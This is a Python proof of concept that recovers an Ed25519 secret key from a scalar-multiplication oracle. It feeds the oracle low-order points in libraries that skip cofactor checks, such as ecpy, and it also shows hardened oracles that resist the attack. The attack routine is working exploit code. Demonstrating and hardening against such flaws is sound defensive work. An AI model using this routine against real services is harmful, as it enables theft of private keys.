from ecpy.curves import Curve
import base64
from objective_sodium import Ed25519 as cv_obj,Scalar

"""demonstrates an attack on an ed25519 multiplication oracle using low order points
affects libraries that don't check points have zeroed cofactor (EG:ecpy)
ECPY implementation can be hardened to resist the attack
alternatively use a library that checks its points

Note:the oracle in this attack accepts a parameter "multiple" which multiplies
the secret scalar prior to multiplication. Someone can generate multiples of
your public key to use as a new public key others won't recognise.
"""

def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('modular inverse does not exist')
    else:
        return x % m


import hashlib
def decodeint(s):
    return sum(256**i * b for i,b in enumerate(bytearray(s)))
def encodeint(y,n):
    return bytes(bytearray((y>>i*8)&255 for i in range(n)))
def sha512(m):return hashlib.sha512(m).digest()
def h_int(m):return decodeint(sha512(m))


cv = Curve.get_curve('Ed25519')

#generator for low order group G
single=cv.decode_point(base64.b16decode(b'26E8958FC2B227B045C3F489F2EF98F0D5DFAC05D3C63339B13802886D53FC05'))
inv8=modinv(8,cv.order)
lo_list=[(cv.generator+single)*i-cv.generator*i for i in range(8,16)]
def get_lo(X):
    #get the low order group information from a point
    X_lo=X-X*8*inv8 #isolate LO info
    return lo_list.index(X_lo) #find it in the list

def low_order_attack(pk,mul_oracle):
    """given a multiplication oracle F(P,v)=P*(secret*v) , perform an attack using low order points to find the secret"""
    val=0
    P=cv.generator+single
    multiple=1
    for i in range(128):
        Q=cv.decode_point(mul_oracle(cv.encode_point(P), multiple))
        bits=get_lo(Q)
        val=(val&~7)+bits
        #check for doneness
        maybe=val*(8**i)%cv.order
        if cv.generator*maybe==pk:
            print("done after %i rounds"%(i))
            return maybe
        #we got some bits, now shift things
        val=val*inv8%cv.order
        multiple=multiple*inv8%cv.order
    print("failed")
    return None


secret=0xda60b01d6ed30131903539014f529dcc12b1496d16309ea84676097ee0424bf
pk=cv.generator*secret

def mul_oracle(X,v):
    X=cv.decode_point(X)
    val=(X*((v*secret)%cv.order))
    return cv.encode_point(val)

def mul_oracle_secure(X,v):
    X=cv.decode_point(X)
    #don't leak low order bits
    #note: this is still vulnerable to a timing attack
    val=(X*8*((v*secret*inv8)%cv.order))
    return cv.encode_point(val)

secret_Scalar=Scalar(secret)#use Scalar class for constant time scalar arithmetic
def mul_oracle_objective_sodium(X,v):
    """This one uses the objective sodium library
    All point multiplications check cofactor is cleared"""
    try:val=(X*(v*secret_Scalar))
    except RuntimeError:#low order point
        return b"\0"*32 #return zero
    return cv.encode_point(val)

if __name__=="__main__":
    print("trying naive multiplication oracle")
    s=low_order_attack(pk,mul_oracle)
    print("trying hardened multiplication oracle")
    s=low_order_attack(pk,mul_oracle_secure)
    print("trying naive(objective_sodium) multiplication oracle")
    s=low_order_attack(pk,mul_oracle_objective_sodium)